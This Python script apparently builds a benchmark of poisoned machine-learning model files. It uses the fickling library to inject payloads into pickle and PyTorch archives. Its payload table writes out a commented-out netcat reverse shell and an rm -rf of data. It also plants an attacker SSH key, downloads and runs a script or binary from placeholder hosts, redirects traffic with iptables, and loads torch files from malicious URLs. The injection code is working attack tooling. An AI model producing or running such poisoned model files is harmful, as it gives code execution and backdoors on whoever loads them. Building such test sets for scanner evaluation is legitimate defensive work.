import json
import os
import random
import sys
import traceback
import zipfile
from functools import partial
from pathlib import Path
from typing import BinaryIO, Optional

import logger

from fickling.fickle import Pickled

# Payloads that are shell commands intended to be executed by importing a code exec primitive
# such as eval(), exec(), subprocess, and others
# Keys are payload ID, values are a tuple:
# - exec primitive function
# - argument to pass to exec primitive
EXEC_PRIMITIVE_PAYLOADS = {
    # This triggers alerts "os.system reverse shell cmd": ("os.system", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f"), # Reverse shell (on local IP)
    "os.system reverse shell cmd": ("os.system", "ls"),
    "subprocess.run rm data": (
        "subprocess.run",
        ["rm", "-rf", "/fakedir/data"],
    ),  # Delete local files
    "os.system add ssh priv key": (
        "os.system",
        """
cd ~/myhomedir && mkdir .ssh;
echo "-----BEGIN RSA PRIVATE KEY-----\nMIIEoQIBAAKCAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3wIBIwKCAQBaUjR5bUXnHGA5fd8NUqrUx0zeBQsKlv1bK5DVm1GSzLj4TU/S83B1NF5/1ihzofI7OAQvlCdUY2tHpGGazQ6ImSpUQ5i9+GgBUOaklRL/i9cHdFv7PSonW+SvF1UKY5EidEJRb/O6oFgB5q8GJKrwu+HPNhvD+dliBnCn0JU+Op/1Af7XxAP814Rz0nZZwx+9KBWVdAAbBIQ5zpROeBBlLSGDsnsQN/lG7w8sHDqsSt2BCK8c9ct31n14TK6HgOx3EuSbisEmKKwhWV6/ui/qWrrzurXA4Q73wO1cPtPg4sx2JBh3EMRm9tfyCCtB1gBi0N/2L7j9xuZGGY6hJETbAoGBANI8HzRjytWBMvXh6TnMOa5S7GjoLjdA3HXhekyd9DHywrA1pby5nWP7VNP+ORL/sSNl+jugkOVQYWGG1HZYHk+OQVo3qLiecBtp3GLsYGzANA/EDHmYMUSm4v3WnhgYMXMDxZemTcGEyLwurPHumgy5nygSEuNDKUFfWO3mymIXAoGBAMqZi3YLzDpL9Ydj6JhO51aoQVT91LpWMCgK5sREhAliWTWjlwrkroqyaWAUQYkLeyA8yUPZPufBmrO0FkNa+4825vg48dyq6CVobHHR/GcjAzXiengi6i/tzHbA0PEai0aUmvwYOasZYEQI47geBvVD3v7D/gPDQNoXG/PWIPt5AoGBAMw6Z3S4tmkBKjCvkhrjpb9JPW05UXeA1ilesVG+Ayk096PcV9vngvNpLdVAGi+2jtHuCQa5PEx5+DLav8Nriyi2E5l35bqoiilCQ83PriCAMpL49iz6Pn00Z3o+My1ZVJudQ5qhjVznY+oBdM3DNpAExn6yeL+DEiI/XbPngsWvAoGAbfuU2a6iEQSp28iFlIKa10VlS2U493CdzJg0IWcF2TVjoMaFMcyZQ/pzt9B7WQY7hodl8aHRsQKzERieXxQiKSxuwUN7+3K4iVXxuiGJBMndK+FYbRpEnaz591K6kYNwLaEg70BZ0ek0QjC2Ih7t1ZnfdFvEaHFPF05foaAgiIMCgYAsNZut02SC6hwwaWh3Uxr07s6jB8HyrET0v1vOyOe3xSJ9YPt7c1Y20OQOFb3Yq4pdHm7AosAgtfC1eQi/xbXP73kloEmg39NZAfT3wg817FXiS2QGHXJ4/dmK94Z9XOEDocClV7hr9H//hoO8fV/PHXh0oFQvw1d+29nf+sgWDg==\n-----END RSA PRIVATE KEY-----" >> ~/.ssh/authorized_keys
""",
    ),  # Add attacker SSH key
    "builtins.exec subprocess download script and execute": (
        "builtins.exec",
        "subprocess.call('wget https://999.3.2.1/script.sh && ./script.sh', shell=True)",
    ),  # Download and execute malicious script
    "subprocess.check_output redirect network traffic": (
        "subprocess.check_output",
        [
            "iptabless",
            "-t",
            "nat",
            "-A",
            "PREROUTING",
            "-p",
            "tcp",
            "--dport",
            "3124",
            "-j",
            "DNAT",
            "--to-destination",
            "1.2.3.4:4539",
        ],
    ),  # Redirect incoming traffic
    "numpy runstring": (
        "numpy.testing._private.utils.runstring",
        '__import__("os").system("ls -la")',
        {},
    ),
    "shutil os ls": ("shutil.os.system", "ls -la"),
}


def inject_download_and_run_binary(pickled: Pickled):
    pickled.insert_python(
        "https://999.2.3.4:777",
        "./file.bin",
        module="urllib.request",
        attr="urlretrieve",
        run_first=False,
    )
    pickled.insert_python("./file.bin", [], {}, module="shutil.os", attr="execve", run_first=False)


DANGEROUS_PRIMITIVE_PAYLOADS = {
    "torch load_state_dict URL": (
        "torch.hub.load_state_dict_from_url",
        "http://1.2.3.999/malicious_files.pth",
    ),
    "torch load URL": ("torch.hub.load", "malicious_gh_account/malicious_gh_repo_*", "entrypoint"),
    "torch load local file": ("torch.load", "./malicious_hf_model/malicious_file"),
    # doesn't work because argv not set... "torch bottleneck exec python file": ("torch.utils.bottleneck.__main__.main", "./malicious_script.py"),
}


def inject_exec_primitive(pickled: Pickled, module: str, attr: str, args: list):
    run_first = random.choice([True, False])
    pickled.insert_python(*args, module=module, attr=attr, run_first=run_first)


# Populate collection of all payloads. The dict values are functions that accept one
# 'Pickled' object as argument.
ALL_PAYLOADS = {
    "dl and run binary": inject_download_and_run_binary,
}


def _add_simple_payload(key, pl):
    function = pl[0]
    module, attr = function.rsplit(".", 1)
    args = list(pl[1:])
    ALL_PAYLOADS[key] = partial(inject_exec_primitive, module=module, attr=attr, args=args)


for key, pl in (EXEC_PRIMITIVE_PAYLOADS | DANGEROUS_PRIMITIVE_PAYLOADS).items():
    _add_simple_payload(key, pl)


def _get_payload(payload_key: Optional[str] = None):
    if payload_key is None:
        return random.choice(list(ALL_PAYLOADS.items()))
    else:
        return (payload_key, ALL_PAYLOADS[payload_key])


def _inject_payload(infile: BinaryIO, outfile: BinaryIO, payload_key: Optional[str] = None):
    # Get payload
    payload_id, inject_func = _get_payload(payload_key)
    # Inject
    pickled = Pickled.load(infile)
    inject_func(pickled)
    # Dump
    pickled.dump(outfile)
    return payload_id


def inject_pickle_file(infile: Path, outfile: Path, payload_key: Optional[str] = None):
    """Return the ID of the payload that was injected"""
    print(f"> Injecting payload in {infile}")
    print(f"\t> Writing malicious pickle in {outfile}")
    with open(infile, "rb") as f, open(outfile, "wb") as outf:
        return _inject_payload(f, outf, payload_key)


def inject_pytorch_file(infile: Path, outfile: Path, payload_key: Optional[str] = None):
    """Return the ID of the payload that was injected"""
    print(f"> Injecting payload in {infile}")
    print(f"\t> Writing malicious pickle in {outfile}")

    archive = zipfile.ZipFile(infile)
    outarchive = zipfile.ZipFile(outfile, "w")
    injected = False
    res = None
    for element in archive.infolist():
        if not injected and element.filename.endswith((".pkl", ".pickle", ".pk")):
            print(f"\t\tInjecting into archive element {element.filename}")
            # Only inject one pickle file per archive
            with zipfile.Path(archive, at=element.filename).open("rb") as inf, zipfile.Path(
                outarchive, at=element.filename
            ).open("wb") as outf:
                res = _inject_payload(
                    inf,
                    outf,
                    payload_key,
                )
            injected = True
        else:
            print(f"\t\tCopying archive element {element.filename}")
            # Just copy file
            with archive.open(element.filename, "r") as f:
                outarchive.writestr(element.filename, f.read())
    archive.close()
    outarchive.close()
    # Make sure we injected the payload in a file
    if injected:
        return res
    else:
        raise Exception("No pickle found in torch archive")


def create_malicious_dataset(clean_dataset_dir: Path, outdir: Path, n: int = 10):
    if outdir.exists():
        print(f"Warning: folder {outdir} already exists")
    else:
        outdir.mkdir()

    with open(clean_dataset_dir / "index.json") as f:
        clean_index = json.load(f)
    malicious_index = []
    for f in clean_index:
        filename = os.path.basename(f["file"])
        outfile = outdir / filename
        try:
            # TODO(boyan): check "type" field with new datasets
            # TODO(boyan): factorize the extensino check in utils
            if f["type"] == "pytorch":
                payload_id = inject_pytorch_file(f["file"], outfile)
            elif f["type"] == "pickle":
                payload_id = inject_pickle_file(f["file"], outfile)
            else:
                raise Exception("Unexpected file extension")
            # TODO(boyan): add payload type for stats on the benchmark
            malicious_index.append(
                {
                    "file": str(outfile.resolve()),
                    "original_file": f["file"],
                    "payload": f"{payload_id}",
                    "type": f["type"],
                }
            )
            n -= 1
        except Exception as e:
            print(traceback.format_exc())
            logger.error(f"Failed on file {filename}: {e}")
        if n <= 0:
            break
    with open(outdir / "index.json", "w") as f:
        json.dump(malicious_index, f)


if __name__ == "__main__":
    indir = Path(sys.argv[1])
    outdir = Path(sys.argv[2])
    n = int(sys.argv[3])
    create_malicious_dataset(indir, outdir, n=n)
